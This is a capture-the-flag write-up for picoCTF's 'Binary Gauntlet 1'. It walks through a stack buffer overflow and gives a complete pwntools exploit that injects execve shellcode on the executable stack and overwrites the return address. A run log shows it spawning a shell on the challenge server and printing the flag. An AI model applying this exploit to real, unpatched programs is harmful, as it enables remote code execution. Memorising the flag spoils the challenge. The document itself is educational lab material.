# Binary Gauntlet 1
Category: Binary Exploitation, 30 points

## Description

> Okay, time for a challenge.

A binary file was attached.

## Solution

This is the follow-up for [Binary Gauntlet 0](Binary_Gauntlet_0.md).

Let's run `checksec` on the file:

```console
┌──(user@kali)-[/media/sf_CTFs/pico/Binary_Gauntlet_1]
└─$ checksec --file=gauntlet
[*] '/media/sf_CTFs/pico/Binary_Gauntlet_1/gauntlet'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

We can see that there are virtually no protections for this program.

Using Ghidra, we can check the decompiled output of the program:

```c
undefined8 main(void)

{
  char local_78 [104];
  char *local_10;
  
  local_10 = (char *)malloc(1000);
  printf("%p\n",local_78);
  fflush(stdout);
  fgets(local_10,1000,stdin);
  local_10[999] = '\0';
  printf(local_10);
  fflush(stdout);
  fgets(local_10,1000,stdin);
  local_10[999] = '\0';
  strcpy(local_78,local_10);
  return 0;
}
```


We can see the the SIGSEGV handler from the previous challenge was removed. We can also see that the local buffer's address is leaked to us. Since NX is disabled according to `checksec` and the stack is executable, if we're able to copy some shellcode to the stack we'll be able to execute it. Getting the shellcode to `local_78` which resides on the stack is easy - we just need to provide it to the second `fgets` which will conveniently copy it to `local_78` using `strcpy`. We just need to make sure that the shellcode doesn't have any NULL pointers since `strcpy` will stop copying the buffer once it hits a NULL pointer.

We already know the address of `local_78` from the leak, so we just need to make sure that the program eventually jumps to it. We can do that by overflowing the stack and overriding the return pointer of `main` so that instead of returning to the function that called it, it will jump to `local_78` instead.

The following script automates the process:

```python
# First, generate a pwntools template using the following command:
#  pwn template --host mercury.picoctf.net --port 32853 ./gauntlet

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x400000)
# RWX:      Has RWX segments

def get_overflow_offset():
    # It's problematic to create a core dump on an NTFS file system,
    # so reconfigure core dumps to be created elsewhere
    with open("/proc/sys/kernel/core_pattern") as f:
        core_pattern = f.read()
        if core_pattern.strip() == "core":
            from pathlib import Path
            raise Exception("Please run the following command first:\n"
                            "mkdir -p {0} && "
                            "sudo bash -c 'echo {0}/core_dump > /proc/sys/kernel/core_pattern'"
                            .format(Path.home() / "core"))
    #os.system("echo ~/core/core_dump > /proc/sys/kernel/core_pattern")
    os.system("rm core.* > /dev/null")
    proc = process(exe.path)
    payload = cyclic(150, n = exe.bytes)
    proc.sendline("dummy")
    proc.sendline(payload)
    proc.wait()
    offset = cyclic_find(proc.corefile.fault_addr, n = exe.bytes )
    log.info("Overflow offset: {}".format(offset))
    return offset


overflow_offset = get_overflow_offset()

io = start()

shellcode = shellcraft.sh()
log.info("Shellcode:\n{}".format(shellcode))

buffer_address = int(io.recvlineS(), 16)
log.info(f"Local Buffer address: {hex(buffer_address)}")

log.info("Sending dummy payload")
io.sendline("dummy")

io.recvlineS()

payload = fit({
     0: asm(shellcode),
     overflow_offset: p64(buffer_address)
})

log.info("Sending payload:\n{}".format(hexdump(payload)))
io.sendline(payload)

io.interactive()

```

Running it:

```console
┌──(user@kali)-[/media/sf_CTFs/pico/Binary_Gauntlet_1]
└─$ python3 exploit.py
[*] '/media/sf_CTFs/pico/Binary_Gauntlet_1/gauntlet'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
[+] Starting local process '/media/sf_CTFs/pico/Binary_Gauntlet_1/gauntlet': pid 2284
[*] Process '/media/sf_CTFs/pico/Binary_Gauntlet_1/gauntlet' stopped with exit code -11 (SIGSEGV) (pid 2284)
[+] Parsing corefile...: Done
[*] '/media/sf_CTFs/pico/Binary_Gauntlet_1/core.2284'
    Arch:      amd64-64-little
    RIP:       0x40074e
    RSP:       0x7ffe75deb408
    Exe:       '/media/sf_CTFs/pico/Binary_Gauntlet_1/gauntlet' (0x400000)
    Fault:     0x6161616161616170
[*] Overflow offset: 120
[+] Opening connection to mercury.picoctf.net on port 32853: Done
[*] Shellcode:
        /* execve(path='/bin///sh', argv=['sh'], envp=0) */
        /* push b'/bin///sh\x00' */
        push 0x68
        mov rax, 0x732f2f2f6e69622f
        push rax
        mov rdi, rsp
        /* push argument array ['sh\x00'] */
        /* push b'sh\x00' */
        push 0x1010101 ^ 0x6873
        xor dword ptr [rsp], 0x1010101
        xor esi, esi /* 0 */
        push rsi /* null terminate */
        push 8
        pop rsi
        add rsi, rsp
        push rsi /* 'sh\x00' */
        mov rsi, rsp
        xor edx, edx /* 0 */
        /* call execve() */
        push SYS_execve /* 0x3b */
        pop rax
        syscall
[*] Local Buffer address: 0x7ffe4ad0f590
[*] Sending dummy payload
[*] Sending payload:
    00000000  6a 68 48 b8  2f 62 69 6e  2f 2f 2f 73  50 48 89 e7  │jhH·│/bin│///s│PH··│
    00000010  68 72 69 01  01 81 34 24  01 01 01 01  31 f6 56 6a  │hri·│··4$│····│1·Vj│
    00000020  08 5e 48 01  e6 56 48 89  e6 31 d2 6a  3b 58 0f 05  │·^H·│·VH·│·1·j│;X··│
    00000030  6d 61 61 61  6e 61 61 61  6f 61 61 61  70 61 61 61  │maaa│naaa│oaaa│paaa│
    00000040  71 61 61 61  72 61 61 61  73 61 61 61  74 61 61 61  │qaaa│raaa│saaa│taaa│
    00000050  75 61 61 61  76 61 61 61  77 61 61 61  78 61 61 61  │uaaa│vaaa│waaa│xaaa│
    00000060  79 61 61 61  7a 61 61 62  62 61 61 62  63 61 61 62  │yaaa│zaab│baab│caab│
    00000070  64 61 61 62  65 61 61 62  90 f5 d0 4a  fe 7f 00 00  │daab│eaab│···J│····│
    00000080
[*] Switching to interactive mode
$ ls
flag.txt
gauntlet
gauntlet_no_aslr
xinet_startup.sh
$ cat flag.txt
c6e16a1b4182c2801ed657d4c482af88
```

The flag: `c6e16a1b4182c2801ed657d4c482af88`